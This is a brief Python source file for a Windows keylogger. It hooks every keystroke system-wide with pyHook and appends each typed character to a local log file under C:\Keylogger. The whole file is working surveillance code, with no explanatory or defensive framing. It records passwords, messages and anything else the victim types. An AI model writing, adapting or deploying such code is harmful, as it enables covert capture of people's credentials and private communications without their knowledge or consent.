import pyHook
import pythoncom
import sys
import logging
import os

LOG_TARGET = "C:\\Keylogger\\log.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename    = LOG_TARGET    , \
                        level       = logging.DEBUG , \
                        format      = "%(message)s" , )
    
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))

    with open(LOG_TARGET, "rb+") as f:
        f.seek(-1, os.SEEK_END)
        f.truncate()
        
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


